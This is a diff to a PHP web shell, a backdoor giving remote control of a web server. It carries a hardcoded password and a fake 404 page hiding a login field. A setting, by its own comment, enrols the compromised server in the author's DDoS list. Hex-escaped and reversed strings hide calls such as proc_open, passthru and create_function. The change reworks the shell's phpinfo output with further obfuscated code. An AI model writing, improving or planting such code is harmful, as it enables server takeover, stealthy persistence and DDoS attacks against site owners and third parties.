@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.85;
+$version            = 2.86;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -12,6 +12,7 @@ global $pass, $version, $adaptiveerrorpage, $checkforupdates, $helpsupportbooter
 $prg = "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
 $prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
 $prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
+$prgs = "\x70\x72\x65\x67\x5F\x73\x70\x6C\x69\x74";
 $sf = "suhosin_fun\x63_exi\x73ts";
 $prco = "pr\x6F\x63\x5Fop\x65n";
 $pt = "p\x61\x73\x73th\x72u";
@@ -202,14 +203,6 @@ $errmsg = '';
 $uchar = '&#9650;';
 $dchar = '&#9660;';
 !$action && $action = 'file';
-if ($action == 'phpinfo') {
-    if (IS_PHPINFO) {
-        phpinfo();
-        exit;
-    } else {
-        $errmsg = 'phpinfo() function has non-permissible';
-    }
-}
 if ($doing == 'downfile' && $thefile) {
     if (!@file_exists($thefile)) {
         $errmsg = 'The file you want to download was nonexistent';
@@ -664,7 +657,18 @@ function shutDownFunction($phpcode, $action, $charsetpage, $charsetpagedb) {
         echo '</span></div></body></html>';
     } 
 }
-if ($action == 'file') {
+if ($action == 'phpinfo') {
+    if (IS_PHPINFO) {
+        $f=strrev(strrev("on")."itc".strrev("e_fun")."tae"."\x72\x63");
+        ob_start();
+        phpinfo();
+        $prgm('%<style type="text/css">(.*?)</style>.*?(<body>.*</body>)%s', ob_get_clean(), $matches);
+        echo "<div class='phpinfodisplay'><style type='text/css'>\n",
+        join( "\n",array_map($f('$i', 'return ".phpinfodisplay " . ' . "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65" . '( "/,/", ",.phpinfodisplay ", $i );'),$prgs( '/\n/', $matches[1] ))),"</style>\n",$matches[2],"\n</div>\n";
+    } else {
+        $errmsg = 'phpinfo() function has non-permissible';
+    }
+}elseif ($action == 'file') {
     $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
     if ($newdirname) {
         $mkdirs = $nowpath . $newdirname;
